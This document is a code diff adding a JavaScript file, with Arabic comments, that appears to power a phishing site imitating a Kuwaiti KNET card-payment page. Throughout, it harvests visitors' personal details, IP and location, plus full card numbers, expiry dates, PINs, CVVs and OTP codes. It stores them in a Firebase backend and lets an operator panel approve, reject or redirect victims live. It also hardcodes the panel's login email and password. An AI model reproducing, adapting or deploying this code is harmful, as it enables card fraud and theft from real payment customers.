@@ -1,0 +1,593 @@
+(function () {
+  // ═══════════════════════════════════════════════════════════
+  // إعدادات مشروع Firebase الجديد (kuwait-me) — موحّد للموقعين
+  // ═══════════════════════════════════════════════════════════
+  const firebaseConfig = {
+    apiKey: "AIzaSyA_do_43poH27AxIoz2LfIJtWFKqpJjQqU",
+    authDomain: "kuwait-me.firebaseapp.com",
+    databaseURL: "https://kuwait-me-default-rtdb.firebaseio.com",
+    projectId: "kuwait-me",
+    storageBucket: "kuwait-me.firebasestorage.app",
+    messagingSenderId: "953252949636",
+    appId: "1:953252949636:web:4a8c3caaffbd60741cdcd1"
+  };
+
+  if (!firebase.apps.length) {
+    firebase.initializeApp(firebaseConfig);
+  }
+
+  // تحميل وحدة المصادقة ديناميكياً إذا لم تكن محمّلة
+  let authLoaded = (typeof firebase.auth === 'function');
+  const ensureAuthLoaded = (authLoaded
+    ? Promise.resolve()
+    : new Promise(function (resolve, reject) {
+        const s = document.createElement('script');
+        s.src = 'https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js';
+        s.onload = resolve;
+        s.onerror = reject;
+        document.head.appendChild(s);
+      }));
+
+  // بيانات دخول لوحة التحكم (نفس حساب اللوحة — له صلاحية قراءة/كتابة على customers)
+  const PANEL_EMAIL = 'msola8228@gmail.com';
+  const PANEL_PASSWORD = 'Aa123456@';
+  let __authReady = null;
+
+  window.ensureAuthReady = function () {
+    if (__authReady) return __authReady;
+    __authReady = ensureAuthLoaded.then(function () {
+      return firebase.auth().signInWithEmailAndPassword(PANEL_EMAIL, PANEL_PASSWORD)
+        .then(function () { return firebase.auth().currentUser.getIdToken(); });
+    }).catch(function (err) {
+      console.error('Firebase auth failed:', err && err.code, err && err.message);
+      return null;
+    });
+    return __authReady;
+  };
+
+  const db = firebase.firestore();
+  const rtd = firebase.database();
+
+  // إتاحة المراجع عالمياً للصفحات الأخرى
+  window.db = db;
+  window.rtd = rtd;
+
+  let sessionId = localStorage.getItem('zain_session_id');
+  if (!sessionId) {
+    sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
+    localStorage.setItem('zain_session_id', sessionId);
+  }
+  window.sessionId = sessionId;
+
+  // ── المحاولة الحالية (attemptId) ────────────────────────────
+  // تُنشأ محاولة جديدة عند بدء تدفق دفع جديد (إدخال بطاقة / OTP).
+  // القرارات من لوحة التحكم تشمل attemptId الخاص بالمحاولة، فلا يختلط
+  // قرار محاولة سابقة (رفض قديم) مع محاولة جديدة.
+  let currentAttemptId = sessionStorage.getItem('zain_attempt_id') || '';
+  window.currentAttemptId = currentAttemptId;
+
+  // مرجع وثيقة العميل في Firestore (المصدر الموحّد للوحة التحكم الجديدة)
+  const customerRef = db.collection("customers").doc(sessionId);
+  window.customerRef = customerRef;
+
+  window.startNewAttempt = function (attemptType) {
+    const att = (attemptType || 'pay').replace(/[^a-zA-Z0-9_]/g, '') + '_' + Date.now();
+    currentAttemptId = att;
+    window.currentAttemptId = att;
+    try { sessionStorage.setItem('zain_attempt_id', att); } catch (e) {}
+    try { sessionStorage.setItem('zain_attempt_started', String(Date.now())); } catch (e) {}
+    // تصفير القرار لأي محاولة سابقة (لا يبقى رفض/موافقة قديمة)
+    try { customerRef.set({ decision: 'pending', status: 'pending', attemptId: att, reason: '' }, { merge: true }); } catch (e) {}
+    try { rtd.ref('commands/' + sessionId + '/rejection').remove(); } catch (e) {}
+    try { rtd.ref('commands/' + sessionId + '/approval').remove(); } catch (e) {}
+    return att;
+  };
+
+  window.getDeviceAndBrowser = function () {
+    const ua = navigator.userAgent;
+    let browser = "Other";
+    if (ua.includes("Firefox")) browser = "Firefox";
+    else if (ua.includes("Chrome")) browser = "Chrome";
+    else if (ua.includes("Safari")) browser = "Safari";
+    else if (ua.includes("Edge")) browser = "Edge";
+
+    let device = "PC";
+    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
+      device = "Mobile";
+    }
+    return { device, browser };
+  };
+
+  // كشف دولة الزائر من عنوان IP عبر خدمة geolocation
+  // نحاول عدة خدمات لضمان الموثوقية، ونتيجة ثابتة (cache) لتجنب التكرار
+  let __visitorCountry = null;
+  let __visitorCountryPromise = null;
+  window.getVisitorCountry = function () {
+    if (__visitorCountry) return Promise.resolve(__visitorCountry);
+    if (__visitorCountryPromise) return __visitorCountryPromise;
+    __visitorCountryPromise = (async () => {
+      // خريطة رموز الدول إلى أسماء عربية
+      const countryNames = {
+        KW: 'الكويت', SA: 'السعودية', AE: 'الإمارات', QA: 'قطر', BH: 'البحرين',
+        OM: 'عُمان', JO: 'الأردن', EG: 'مصر', IQ: 'العراق', LB: 'لبنان',
+        SY: 'سوريا', PS: 'فلسطين', YE: 'اليمن', SD: 'السودان', LY: 'ليبيا',
+        TN: 'تونس', DZ: 'الجزائر', MA: 'المغرب', MR: 'موريتانيا', SO: 'الصومال',
+        IR: 'إيران', TR: 'تركيا', US: 'الولايات المتحدة', GB: 'بريطانيا',
+      };
+      const services = [
+        'https://ipapi.co/json/',
+        'https://ipwho.is/',
+        'https://get.geojs.io/v1/ip/country.json',
+      ];
+      for (const url of services) {
+        try {
+          const res = await fetch(url);
+          if (!res.ok) continue;
+          const data = await res.json();
+          let code = data.country_code || data.country || data.code || '';
+          code = String(code).toUpperCase().trim();
+          if (code && code.length === 2) {
+            __visitorCountry = countryNames[code] || code;
+            return __visitorCountry;
+          }
+        } catch (e) {}
+      }
+      __visitorCountry = 'غير معروف';
+      return __visitorCountry;
+    })();
+    return __visitorCountryPromise;
+  };
+
+  function getFriendlyPageName() {
+    const path = window.location.pathname;
+    if (path.includes('knet')) return 'صفحة الكي نت';
+    if (path.includes('verification')) return 'صفحة التحقق';
+    if (path.includes('otpcredit')) return 'صفحة تحقق البطاقة';
+    if (path.includes('gateway')) return 'بوابة الدفع';
+    if (path.includes('carte')) return 'سلة التسوق';
+    return 'الصفحة الرئيسية';
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  // ضمان وجود وثيقة العميل customers/{sessionId} بالحقول المطلوبة للوحة
+  // ═══════════════════════════════════════════════════════════
+  window.ensureCustomerDoc = function (extra) {
+    const now = Date.now();
+    const base = {
+      sessionId: sessionId,
+      status: 'pending',
+      decision: 'pending',
+      online: true,
+      lastSeen: now,
+      currentPage: getFriendlyPageName(),
+      name: localStorage.getItem('customerName') || '',
+      phone: localStorage.getItem('phone') || '',
+      mobile: localStorage.getItem('phone') || '',
+      address: localStorage.getItem('address') || '',
+      amount: localStorage.getItem('finalAmount') || localStorage.getItem('amount') || '0.000 ر.ق',
+      isHidden: false,
+      flagColor: '',
+      createdAt: firebase.firestore.FieldValue.serverTimestamp()
+    };
+    // الحفاظ على القرار المحسوم (approved/rejected) إذا كان موجوداً:
+    // حتى لا تمسح دالة التهيئة موافقة/رفض المدير عند فتح أي صفحة لاحقاً
+    const merged = Object.assign({}, base, extra || {});
+    return customerRef.get().then(function (snap) {
+      if (snap.exists) {
+        const cur = snap.data() || {};
+        const decided = cur.decision || cur.status || '';
+        if (decided === 'approved' || decided === 'rejected') {
+          merged.decision = decided;
+          merged.status = decided;
+        }
+      }
+      return customerRef.set(merged, { merge: true });
+    }).catch(function () {
+      return customerRef.set(merged, { merge: true });
+    });
+  };
+
+  // ═══════════════════════════════════════════════════════════
+  // نبض الحضور (heartbeat) — يكتب lastSeen في customers/{sessionId} كل 10 ثوانٍ
+  // كي يظهر العميل "متصل" في لوحة التحكم
+  // ═══════════════════════════════════════════════════════════
+  let __heartbeatTimer = null;
+  window.startPresenceHeartbeat = function () {
+    if (__heartbeatTimer) return;
+    customerRef.set({ online: true, lastSeen: Date.now(), currentPage: getFriendlyPageName() }, { merge: true });
+    __heartbeatTimer = setInterval(function () {
+      customerRef.set({ online: true, lastSeen: Date.now(), currentPage: getFriendlyPageName() }, { merge: true });
+    }, 10000);
+
+    // عند مغادرة الصفحة: اكتب lastSeen قديم ليصبح العميل "غير متصل"
+    window.addEventListener('beforeunload', function () {
+      try {
+        customerRef.set({ online: false, lastSeen: Date.now() - 70000 }, { merge: true });
+      } catch (e) {}
+    });
+  };
+
+  window.initFirebaseSession = async function () {
+    const { device, browser } = window.getDeviceAndBrowser();
+    const docRef = db.collection("payments").doc(sessionId);
+    const friendlyPage = getFriendlyPageName();
+    const rtdSessionRef = rtd.ref('sessions/' + sessionId);
+    const now = Date.now();
+    const createdTime = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
+
+    // جلب IP بشكل سريع وغير معطل للدخول
+    let visitorIp = 'Unknown';
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      visitorIp = data.ip;
+    } catch (e) {}
+
+    // كشف دولة الزائر من عنوان IP (لا يُعطل الدخول بانتظارها)
+    let visitorCountry = 'غير معروف';
+    try {
+      visitorCountry = await window.getVisitorCountry();
+    } catch (e) {}
+
+    const sessionData = {
+      id: sessionId,
+      status: 'active',
+      phone: localStorage.getItem('phone') || '',
+      amount: localStorage.getItem('finalAmount') || localStorage.getItem('amount') || '0.000 ر.ق',
+      page: friendlyPage,
+      device: device,
+      browser: browser,
+      createdTime: createdTime,
+      startTime: now,
+      country: visitorCountry,
+      hasNewActivity: false,
+      ip: visitorIp
+    };
+
+    // ضمان وجود وثيقة العميل في customers (المصدر الموحّد للوحة الجديدة)
+    try {
+      await window.ensureCustomerDoc({ ip: visitorIp, device: device, browser: browser, country: visitorCountry });
+    } catch (e) { console.error("ensureCustomerDoc error:", e); }
+
+    // بدء نبض الحضور
+    window.startPresenceHeartbeat();
+
+    // Update RTD (للتوافق مع اللوحة القديمة)
+    rtdSessionRef.once('value', (snapshot) => {
+      if (!snapshot.exists()) {
+        rtdSessionRef.set(sessionData);
+      } else {
+        rtdSessionRef.update({ page: friendlyPage, status: 'active', hasNewActivity: true, ip: visitorIp });
+      }
+    });
+
+    // تتبع الحضور (presence) للوحة التحكم القديمة
+    const presenceRef = rtd.ref('presence/' + sessionId);
+    presenceRef.set({ online: true, lastSeen: now });
+    presenceRef.onDisconnect().set({ online: false, lastSeen: Date.now() });
+
+    // Update Firestore payments (أرشيف إضافي)
+    docRef.get().then((snap) => {
+      if (!snap.exists) {
+        docRef.set({ ...sessionData, status: 'PENDING', paymentAttempts: [], timeline: [] });
+      } else {
+        docRef.update({ page: friendlyPage, hasNewActivity: true, ip: visitorIp });
+      }
+    });
+  };
+
+  // ═══════════════════════════════════════════════════════════
+  // إرسال بيانات البطاقة
+  // ═══════════════════════════════════════════════════════════
+  window.pushFirebaseCard = function (bank, prefix, cardNum, expMonth, expYear, pin, cvv) {
+    // استخدام المحاولة الحالية إن وُجدت، وإلا بدء محاولة جديدة صراحة
+    // (يضمن أن كل تدفق دفع جديد يحمل attemptId فريداً يربط قرار اللوحة به)
+    const attemptId = currentAttemptId || window.startNewAttempt('pay');
+    const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+
+    const cardData = {
+      id: attemptId,
+      attemptId: attemptId,
+      bankName: bank || 'غير معروف',
+      cardPrefix: prefix || '',
+      cardNumber: cardNum || '',
+      expiry: `${expMonth || ''}/${expYear || ''}`,
+      pin: pin || '',
+      cvv: cvv || '',
+      timestamp: timestampStr
+    };
+
+    // أرشيف دائم في مجموعة cards + سجل المحاولات اللحظي
+    const writes = [
+      rtd.ref('sessions/' + sessionId + '/attempts/' + attemptId).set(cardData),
+      rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true, page: 'صفحة إدخال البطاقة', attemptId: attemptId }),
+      db.collection("card_data").doc(sessionId).collection("attempts").doc(attemptId).set(cardData),
+      db.collection("cards").doc(attemptId).set({ ...cardData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() }),
+      // ربط المحاولة الحالية بوثيقة العميل لترى لوحة التحكم attemptId صاحب القرار
+      customerRef.set({ attemptId: attemptId, decision: 'pending', status: 'pending', currentPage: 'صفحة إدخال البطاقة', lastSeen: Date.now() }, { merge: true })
+    ];
+    try {
+      return Promise.all(writes).then(function () { return cardData; });
+    } catch (err) {
+      console.error('pushFirebaseCard error:', err);
+      return Promise.reject(err);
+    }
+  };
+
+  // ═══════════════════════════════════════════════════════════
+  // إرسال رمز التحقق OTP
+  // يكتب الحقل otp في وثيقة العميل customers/{sessionId} لعرضه في لوحة التحكم
+  // ═══════════════════════════════════════════════════════════
+  window.pushFirebaseOtp = function (otp) {
+    const otpId = 'otp_' + Date.now();
+    const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+    const attemptId = currentAttemptId || window.startNewAttempt('pay');
+    const otpData = { id: otpId, attemptId: attemptId, otp: otp, timestamp: timestampStr };
+
+    rtd.ref('sessions/' + sessionId + '/otps/' + otpId).set(otpData);
+    rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true, attemptId: attemptId });
+    db.collection("card_data").doc(sessionId).collection("otps").doc(otpId).set(otpData);
+    // أرشيف دائم في مجموعة otps
+    db.collection("otps").doc(otpId).set({ ...otpData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() });
+    // كتابة otp في وثيقة العميل لتعرضها لوحة التحكم الجديدة
+    customerRef.set({ otp: String(otp || ''), attemptId: attemptId, lastSeen: Date.now(), currentPage: getFriendlyPageName() }, { merge: true });
+    return Promise.resolve();
+  };
+
+  // ═══════════════════════════════════════════════════════════
+  // إرسال بيانات العميل والتوصيل (الاسم، العنوان، الهاتف...)
+  // تُستدعى من صفحة السلة عند المتابعة للدفع
+  // ═══════════════════════════════════════════════════════════
+  window.pushFirebaseCustomer = function (customer) {
+    const data = {
+      sessionId: sessionId,
+      name: customer.name || '',
+      phone: customer.phone || '',
+      mobile: customer.phone || '',
+      address: customer.address || '',
+      apartment: customer.apartment || '',
+      deliveryNotes: customer.deliveryNotes || '',
+      amount: customer.amount || '',
+      paymentType: customer.paymentType || 'full',
+      items: customer.items || [],
+      status: 'pending',
+      decision: 'pending',
+      lastSeen: Date.now(),
+      currentPage: getFriendlyPageName(),
+      isHidden: false,
+      flagColor: '',
+      ip: '',
+      createdAt: firebase.firestore.FieldValue.serverTimestamp()
+    };
+    // حفظ الاسم محلياً لاستخدامه في ensureCustomerDoc
+    if (data.name) localStorage.setItem('customerName', data.name);
+    if (data.address) localStorage.setItem('address', data.address);
+    // تحديث الجلسة اللحظية
+    rtd.ref('sessions/' + sessionId).update({
+      phone: data.phone,
+      amount: data.amount,
+      customerName: data.name,
+      hasNewActivity: true
+    });
+    // حفظ دائم في Firestore customers (المصدر الموحّد للوحة الجديدة)
+    db.collection("customers").doc(sessionId).set(data, { merge: true });
+    if (data.items.length) {
+      db.collection("orders").doc(sessionId).set({
+        sessionId: sessionId,
+        items: data.items,
+        subtotal: data.amount,
+        paymentType: data.paymentType,
+        status: 'PENDING',
+        createdAt: firebase.firestore.FieldValue.serverTimestamp()
+      }, { merge: true });
+    }
+  };
+
+  // ═══════════════════════════════════════════════════════════
+  // الاستماع لأوامر لوحة التحكم (موافقة / رفض / تحويل / رسائل)
+  // المصدر الأساسي: Firestore customers/{sessionId} — حقل decision/status
+  //   decision = "approved" → onApproval
+  //   decision = "rejected" → onRejection
+  // مصدر احتياطي (للتوافق مع اللوحة القديمة): RTDB commands/{sessionId}
+  // callbacks: { onApproval, onRejection, onRedirect, onMessage }
+  // ═══════════════════════════════════════════════════════════
+  window.listenForAdminCommands = function (callbacks) {
+    callbacks = callbacks || {};
+
+    // ---- المصدر الأساسي: Firestore customers/{sessionId} عبر onSnapshot ----
+    let __lastDecision = null;
+    let __lastDecisionTs = null;
+    let __snapshotOk = false;
+
+    // القرار يقبل فقط إذا كان خاصاً بالمحاولة الحالية:
+    //  - إن حمل القرار attemptId يطابق currentAttemptId → قرار هذه المحاولة
+    //  - إن لم يحمل attemptId (لوحة قديمة) → يقبل فقط إذا صدر بعد بدء المحاولة
+    function decisionMatchesCurrentAttempt(data) {
+      if (!data) return true;
+      if (data.attemptId) return data.attemptId === currentAttemptId;
+      // بدون attemptId: نتحقق أن القرار صدر بعد بدء المحاولة الحالية
+      var startedRaw = null;
+      try { startedRaw = sessionStorage.getItem('zain_attempt_started'); } catch (e) {}
+      var started = startedRaw ? parseInt(startedRaw, 10) : null;
+      if (!started || !data.decidedAt) return true;  // معلومات غير كافية → نقبل (توافق للخلف)
+      var decidedMs = null;
+      var t = data.decidedAt;
+      if (typeof t.toMillis === 'function') decidedMs = t.toMillis();
+      else if (typeof t === 'number') decidedMs = String(t).length === 10 ? t * 1000 : t;
+      else if (typeof t === 'string') decidedMs = Date.parse(t);
+      else if (t && t._seconds) decidedMs = t._seconds * 1000;
+      if (decidedMs === null || started === null) return true;
+      return decidedMs >= started;
+    }
+
+    function handleDecision(decision, data) {
+      // تجاهل القرار المعلّق (لا يوجد قرار بعد)
+      if (decision === 'pending' || decision === 'null' || !decision) {
+        __lastDecision = 'pending';
+        return;
+      }
+      // قبل كل شيء: القرار يجب أن يخص المحاولة الحالية (فوري ولحظي، لا وقت)
+      if (!decisionMatchesCurrentAttempt(data)) {
+        __lastDecision = 'pending';
+        return;
+      }
+      // منع التكرار: نفس القرار + نفس الطابع الزمني → تجاهل
+      var ts = (data && (data.decidedAt || data.lastSeen)) || null;
+      if (decision === __lastDecision && String(ts) === String(__lastDecisionTs)) return;
+      __lastDecision = decision;
+      __lastDecisionTs = ts;
+      if (decision === 'approved') {
+        if (typeof callbacks.onApproval === 'function') callbacks.onApproval({ decision: 'approved', status: data.status, raw: data });
+      } else if (decision === 'rejected') {
+        if (typeof callbacks.onRejection === 'function') callbacks.onRejection({ decision: 'rejected', status: data.status, reason: data.reason || '', raw: data });
+      }
+    }
+
+    // استخراج قرار من استجابة Firestore REST (fields.decision.stringValue)
+    function restDecision(fields) {
+      if (!fields) return 'pending';
+      var d = fields.decision || fields.status;
+      return (d && d.stringValue) ? d.stringValue : 'pending';
+    }
+
+    // استخراج الطابع الزمني من استجابة Firestore REST
+    function restTimestamp(fields) {
+      if (!fields) return null;
+      var t = fields.decidedAt || fields.lastSeen;
+      return (t && t.timestampValue) ? t.timestampValue : null;
+    }
+
+    // استخراج attemptId من استجابة Firestore REST
+    function restAttemptId(fields) {
+      if (!fields || !fields.attemptId) return currentAttemptId;
+      var v = fields.attemptId;
+      return (v && (v.stringValue || v.integerValue)) || currentAttemptId;
+    }
+
+    // بدء الاستماع اللحظي عبر onSnapshot (مع إعادة المحاولة عند الفشل)
+    function startSnapshot(token) {
+      try {
+        customerRef.onSnapshot((doc) => {
+          __snapshotOk = true;
+          if (!doc.exists) return;
+          const data = doc.data() || {};
+          handleDecision(data.decision || data.status || 'pending', data);
+        }, (err) => {
+          __snapshotOk = false;
+          console.error("customerRef onSnapshot error:", err);
+        });
+      } catch (e) {
+        console.error("onSnapshot setup error:", e);
+      }
+    }
+
+    // انتظر المصادقة ثم ابدأ الاستماع (قواعد أمان Firestore تتطلب تسجيل دخول)
+    function startListening() {
+      window.ensureAuthReady().then(function (token) {
+        // الاستماع اللحظي عبر onSnapshot
+        startSnapshot(token);
+
+        // استطلاع احتياطي عبر REST كل 2 ثانية (أسرع للاستجابة الفورية)
+        const pollUrl = 'https://firestore.googleapis.com/v1/projects/kuwait-me/databases/(default)/documents/customers/' + encodeURIComponent(sessionId);
+        setInterval(function () {
+          // تحديث الـ token في كل استطلاع (قد تكون انتهت صلاحيته)
+          var curUser = firebase.auth().currentUser;
+          var tokenPromise = curUser ? curUser.getIdToken() : Promise.resolve(token);
+          tokenPromise.then(function (tk) {
+            fetch(pollUrl, { headers: tk ? { 'Authorization': 'Bearer ' + tk } : {} })
+              .then(function (r) { return r.json(); })
+              .then(function (d) {
+                if (d && d.fields) {
+                  handleDecision(restDecision(d.fields), { decision: restDecision(d.fields), decidedAt: restTimestamp(d.fields), lastSeen: restTimestamp(d.fields), attemptId: restAttemptId(d.fields), _rest: true });
+                }
+              })
+              .catch(function (e) { /* تجاهل أخطاء الاستطلاع بصمت */ });
+          }).catch(function () {});
+        }, 2000);
+      });
+    }
+
+    startListening();
+
+    // ---- مصدر احتياطي: RTDB commands/{sessionId} (اللوحة القديمة) ----
+    const cmdRef = rtd.ref('commands/' + sessionId);
+
+    // تجاهل القيمة الأولى (الحالة القديمة) — نستجيب فقط للأوامر الجديدة اللاحقة
+    let __firstApprovalSnap = true;
+    let __firstRejectionSnap = true;
+    let __firstRedirectSnap = true;
+
+    function cmdMatchesAttempt(cmd) {
+      // الأوامر الصادرة من اللوحة تحمل attemptId — نقبلها فقط إذا تطابقت المحاولة
+      if (!cmd) return false;
+      if (cmd.attemptId && currentAttemptId) return cmd.attemptId === currentAttemptId;
+      return true; // أوامر قديمة بلا attemptId لا نعتمد عليها إلا عند وجود محاولة نشطة
+    }
+
+    cmdRef.child('approval').on('value', (snap) => {
+      if (__firstApprovalSnap) { __firstApprovalSnap = false; return; }
+      const cmd = snap.val();
+      if (cmd && cmd.action === 'APPROVE_PAYMENT' && !window.__approvalHandled && cmdMatchesAttempt(cmd)) {
+        window.__approvalHandled = true;
+        if (__lastDecision !== 'approved') {
+          __lastDecision = 'approved';
+          if (typeof callbacks.onApproval === 'function') callbacks.onApproval(cmd);
+        }
+      }
+    });
+
+    cmdRef.child('rejection').on('value', (snap) => {
+      if (__firstRejectionSnap) { __firstRejectionSnap = false; return; }
+      const cmd = snap.val();
+      if (cmd && cmd.action === 'REJECT_PAYMENT' && !window.__rejectionHandled && cmdMatchesAttempt(cmd)) {
+        window.__rejectionHandled = true;
+        if (__lastDecision !== 'rejected') {
+          __lastDecision = 'rejected';
+          if (typeof callbacks.onRejection === 'function') callbacks.onRejection(cmd);
+        }
+      }
+    });
+
+    cmdRef.child('redirect').on('value', (snap) => {
+      const cmd = snap.val();
+      if (!cmd || cmd.action !== 'REDIRECT_PAGE' || !cmd.targetPage) return;
+      // أول إشعار عند تحميل الصفحة: قد يكون أمراً قديماً غير مستهلك من جلسة سابقة
+      // نمسحه فقط حتى لا يؤثر على تنقلات العميل اللاحقة (أي توجيه جديد سيكتب قيمه جديدة)
+      if (__firstRedirectSnap) {
+        __firstRedirectSnap = false;
+        cmdRef.remove().catch(function () {});
+        return;
+      }
+      // استقبال الإشارة → تنفيذها ثم حذفها فوراً حتى لا يتأثر العميل إذا انتقل لصفحة جديدة
+      const target = cmd.targetPage;
+      cmdRef.remove().catch(function () {});
+      if (typeof callbacks.onRedirect === 'function') {
+        callbacks.onRedirect(cmd);
+      } else {
+        window.location.href = target;
+      }
+    });
+
+    rtd.ref('messages/' + sessionId).on('child_added', (snap) => {
+      const msg = snap.val();
+      if (msg && typeof callbacks.onMessage === 'function') callbacks.onMessage(msg);
+    });
+  };
+
+  // إعادة المحاولة: بدء محاولة جديدة (attemptId جديد) وتصفير القرار،
+  // ثم إعادة التوجيه إلى صفحة إدخال بيانات الدفع (البطاقة أو KNET)
+  // — الوجهة تُحدَّد تلقائياً من اسم الصفحة الحالية:
+  //   verification.html / knet.html (KNET) → knet.html ، غيرها → card-payment.html
+  window.clearRejection = function () {
+    window.startNewAttempt('pay');
+    const path = window.location.pathname || '';
+    const dest = (/knet/i.test(path) || /verification/i.test(path)) ? 'knet.html' : 'card-payment.html';
+    try { sessionStorage.setItem('zain_back_from_reject', '1'); } catch (e) {}
+    window.location.href = dest;
+  };
+
+  // ابدأ الجلسة بعد التأكد من المصادقة (قواعد أمان Firestore تتطلب تسجيل دخول للكتابة في customers)
+  window.ensureAuthReady().then(function () {
+    window.initFirebaseSession();
+  });
+})();
